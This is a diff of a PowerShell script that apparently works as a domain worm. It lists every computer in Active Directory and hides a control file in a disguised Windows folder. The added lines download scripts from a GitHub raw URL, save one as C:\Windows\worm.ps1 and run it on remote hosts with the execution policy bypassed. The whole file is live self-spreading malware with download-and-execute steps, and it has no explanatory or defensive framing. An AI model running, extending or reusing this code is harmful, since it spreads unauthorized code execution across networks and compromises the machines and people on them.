@@ -1,4 +1,11 @@
 ﻿$computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
+if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService')){
+    mkdir 'C:\Program Files (x86)\Windows NT\TableTextService'
+    cd 'C:\Program Files (x86)\Windows NT\TableTextService'
+    $WebClient = New-Object System.Net.WebClient
+    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/TableTextServiceDa.txt","C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt")
+}
+
 function wormy{
 
 while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
@@ -18,8 +25,12 @@ Foreach($i in $computerNames){
                 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass
                 }
             }
-            }
-            else{}
+        }
+        else{
+                $WebClient = New-Object System.Net.WebClient
+                $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/EnumerateDomain.ps1","C:\Windows\worm.ps1")
+                C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass   
+        }
         }
     }
     Get-PSSession | Remove-PSSession
